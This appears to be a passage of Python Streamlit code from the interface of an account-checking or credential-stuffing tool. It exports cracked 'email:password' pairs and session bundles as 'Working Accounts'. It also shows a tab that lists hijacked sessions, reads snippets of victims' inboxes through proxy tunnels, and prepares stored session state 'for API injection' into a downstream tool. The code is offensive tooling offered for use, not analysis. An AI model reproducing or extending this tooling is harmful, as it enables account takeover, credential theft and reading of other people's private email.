        if export_mode == "email:password":
            export_data = "\n".join(st.session_state.SUCCESSFUL_ACCOUNTS)
            file_ext = "txt"
            mime_type = "text/plain"
        elif export_mode == "JSON Session Bundle":
            export_data = json.dumps(st.session_state.SUCCESSFUL_ACCOUNTS, indent=2)
            file_ext = "json"
            mime_type = "application/json"
        else:
            export_data = "\n".join([f"url_safe_hit={requests.utils.quote(acc)}" for acc in st.session_state.SUCCESSFUL_ACCOUNTS])
            file_ext = "txt"
            mime_type = "text/plain"

        st.download_button(
            label=f"💾 Download Working Accounts ({file_ext.upper()})",
            data=export_data,
            file_name=f"successful_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{file_ext}",
            mime=mime_type,
            use_container_width=True
        )

    st.markdown("### **📊 Live Execution Log Viewer**")
    st.code("\n".join(st.session_state.engine_logs[-40:]), language="text")

    if cfg.get("ENABLE_DEBUG", True):
        st.markdown("### **🛠️ Conditional Debug Viewer**")
        debug_files = os.listdir(DEBUG_DIR) if os.path.exists(DEBUG_DIR) else []
        st.info(f"Debug Mode Active. Stored Screenshots / Dumps: {len(debug_files)} files in `{DEBUG_DIR}/`")

    if st.session_state.running:
        time.sleep(1.5)
        st.rerun()

with tab_terminal:
    st.subheader("💻 Terminal Remote & Inbox Reader")
    if not st.session_state.LIVE_SESSIONS:
        st.info("No active sessions captured yet. Execute successful runs via the Engine Runner tab.")
    else:
        active_acc = st.selectbox("Active Account Session", list(st.session_state.LIVE_SESSIONS.keys()))
        session_info = st.session_state.LIVE_SESSIONS[active_acc]
        safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', active_acc)
        
        st.code(f"""
Session Active    : {active_acc}
Storage File Path : sessions/{safe_name}.json
Proxy Tunnel      : {session_info.get('proxy', 'Direct')}
Timestamp         : {session_info.get('time', 'N/A')}
--------------------------------------------------
Latest Snippet / Inbox DOM:
{session_info.get('snippet', 'No snippet captured.')}
        """, language="text")
        
        if st.button("📥 Load Session Context into Downstream Tool"):
            st.success(f"Successfully loaded storage state: sessions/{safe_name}.json ready for API injection.")
